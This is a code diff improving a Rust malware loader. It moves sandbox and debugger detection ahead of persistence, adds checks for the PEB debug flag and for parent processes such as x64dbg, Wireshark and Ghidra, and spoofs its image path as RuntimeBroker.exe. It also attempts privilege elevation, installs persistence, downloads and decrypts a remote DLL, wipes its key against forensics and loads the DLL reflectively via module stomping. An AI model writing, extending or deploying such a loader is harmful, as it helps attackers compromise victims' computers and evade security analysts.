@@ -23,17 +23,40 @@ fn main() {
 
     let loader_cfg = LoaderConfig::from_injected(injected, raw_json);
 
-    // 2. Apply persistence (may relaunch/copy and exit)
-    apply_persistence(loader_cfg.require_admin, loader_cfg.copy_to_path.as_deref(), loader_cfg.enable_persistence);
-
-    // 3. Anti-analysis check (skip uptime on boot to avoid self-kill on autostart)
-    if is_sandbox(is_boot) {
+    // 2. Anti-analysis: sandbox + debugger detection (BEFORE any persistence/IOCs)
+    //    Skip uptime check on boot to avoid self-kill on autostart
+    if is_sandbox(is_boot) || check_debugger() {
+        // In sandbox/debugger: execute benign behavior then exit cleanly
         std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
         std::process::exit(0);
     }
 
-    // 4. Decrypt AES key
-    let aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
+    // 3. PEB spoofing — mask image path BEFORE any external calls
+    elevation::spoof_peb("C:\\Windows\\System32\\RuntimeBroker.exe");
+
+    // 4. Elevation attempt (only if config requires admin)
+    if loader_cfg.require_admin {
+        let exe = env::current_exe()
+            .map(|p| p.to_string_lossy().to_string())
+            .unwrap_or_default();
+        if !exe.is_empty() {
+            let _ = elevation::try_elevate(&exe);
+        }
+        // Degrade gracefully if elevation fails
+    }
+
+    // 5. Persistence (only after confirming we're not in a sandbox)
+    if let Some(path) = loader_cfg.copy_to_path.as_deref() {
+        if !path.is_empty() {
+            copy_and_relaunch(path);
+        }
+    }
+    if loader_cfg.enable_persistence {
+        install_persistence();
+    }
+
+    // 6. Decrypt AES key
+    let mut aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
         Ok(k) => k,
         Err(_) => {
             eprintln!("{}", obfstr!("[!] Initialization failed"));
@@ -41,7 +64,7 @@ fn main() {
         }
     };
 
-    // 5. Download and decrypt core DLL
+    // 7. Download and decrypt core DLL
     let download_url = loader_cfg.download_url();
 
     let rt = match tokio::runtime::Builder::new_current_thread()
@@ -71,7 +94,11 @@ fn main() {
         }
     };
 
-    // 6. Validate PE/ELF header
+    // 8. Zeroize AES key from memory (prevent forensic recovery)
+    for b in aes_key.iter_mut() { *b = 0; }
+    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+
+    // 9. Validate PE/ELF header
     if dll_bytes.len() < 2 {
         std::process::exit(1);
     }
@@ -86,7 +113,7 @@ fn main() {
         std::process::exit(1);
     }
 
-    // 7. Reflective load
+    // 10. Reflective load (Module Stomping: RW→memcpy→RX, never RWX)
     let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
         Ok(f) => f,
         Err(_) => {
@@ -95,16 +122,13 @@ fn main() {
         }
     };
 
-    // 8. PEB spoofing — mask image path as a legitimate Windows binary
-    elevation::spoof_peb("C:\\Windows\\System32\\RuntimeBroker.exe");
-
-    // 9. Obfuscated sleep (random 1-5s delay, encrypts .text while sleeping)
+    // 11. Obfuscated sleep (random 1-5s delay via direct syscall)
     {
         let delay_ms = 1000 + (rand::random::<u64>() % 4000);
         sleep_obfuscation::obfuscated_sleep(std::time::Duration::from_millis(delay_ms));
     }
 
-    // 10. Call entry point with config JSON
+    // 12. Call entry point with config JSON
     let config_bytes = loader_cfg.config_json.as_bytes();
     entry_fn(config_bytes.as_ptr(), config_bytes.len());
 
@@ -149,28 +173,6 @@ fn parse_injected_config() -> Option<(InjectedConfig, String)> {
 }
 
 // ── Persistence (lightweight, no libra-modules dependency) ────────────
-
-fn apply_persistence(require_admin: bool, copy_to_path: Option<&str>, enable_persistence: bool) {
-    if require_admin {
-        let exe = env::current_exe()
-            .map(|p| p.to_string_lossy().to_string())
-            .unwrap_or_default();
-        if !exe.is_empty() {
-            let _ = elevation::try_elevate(&exe);
-        }
-        // If not admin after all strategies, continue anyway (degrade gracefully)
-    }
-
-    if let Some(path) = copy_to_path {
-        if !path.is_empty() {
-            copy_and_relaunch(path);
-        }
-    }
-
-    if enable_persistence {
-        install_persistence();
-    }
-}
 
 fn copy_and_relaunch(relative_path: &str) {
     let current_exe = match env::current_exe() {
@@ -287,12 +289,87 @@ fn check_uptime() -> bool {
 fn check_debugger() -> bool {
     #[cfg(target_os = "windows")]
     {
-        check_nt_global_flag() || check_hardware_breakpoints() || check_remote_debugger()
+        check_peb_being_debugged()
+            || check_nt_global_flag()
+            || check_hardware_breakpoints()
+            || check_remote_debugger()
+            || check_parent_process()
     }
     #[cfg(not(target_os = "windows"))]
     {
         check_ptrace_traceme() || check_tracer_pid()
     }
+}
+
+/// PEB->BeingDebugged (byte at PEB+0x2): set to 1 when process is debugged.
+#[cfg(target_os = "windows")]
+fn check_peb_being_debugged() -> bool {
+    unsafe {
+        let peb: *const u8;
+        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb);
+        if peb.is_null() { return false; }
+        *(peb.add(2)) != 0
+    }
+}
+
+/// Check if parent process is a known analysis/debugging tool.
+#[cfg(target_os = "windows")]
+fn check_parent_process() -> bool {
+    use std::os::windows::process::CommandExt;
+
+    // Get parent PID via wmic
+    let output = std::process::Command::new("wmic")
+        .args(["process", "where", &format!("ProcessId={}", std::process::id()), "get", "ParentProcessId", "/format:csv"])
+        .creation_flags(0x08000000)
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::null())
+        .output();
+
+    let parent_pid = match output {
+        Ok(o) => {
+            let text = String::from_utf8_lossy(&o.stdout);
+            // Parse: Node,ParentProcessId\n,12345\n
+            text.lines()
+                .nth(2)
+                .and_then(|l| l.split(',').last())
+                .and_then(|s| s.trim().parse::<u32>().ok())
+                .unwrap_or(0)
+        }
+        Err(_) => return false,
+    };
+
+    if parent_pid == 0 { return false; }
+
+    // Get parent process name
+    let name_output = std::process::Command::new("wmic")
+        .args(["process", "where", &format!("ProcessId={}", parent_pid), "get", "Name", "/format:csv"])
+        .creation_flags(0x08000000)
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::null())
+        .output();
+
+    if let Ok(o) = name_output {
+        let text = String::from_utf8_lossy(&o.stdout);
+        if let Some(name_line) = text.lines().nth(2) {
+            if let Some(name) = name_line.split(',').last() {
+                let name_lower = name.trim().to_lowercase();
+                // Known analysis/debugging tool process names
+                const ANALYSIS_TOOLS: &[&str] = &[
+                    "x64dbg", "x32dbg", "ollydbg", "windbg", "ida", "ida64", "idag",
+                    "procmon", "procexp", "processhacker", "dumpcap", "wireshark",
+                    "vmtoolsd", "vmwaretray", "vmwareuser", "vboxservice", "vboxtray",
+                    "cheatengine", "httpdebugger", "fiddler", "burpsuite",
+                    "immunity", "radare2", "ghidra",
+                ];
+                for tool in ANALYSIS_TOOLS {
+                    if name_lower.contains(tool) {
+                        return true;
+                    }
+                }
+            }
+        }
+    }
+    false
 }
 
 /// PEB->NtGlobalFlag: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
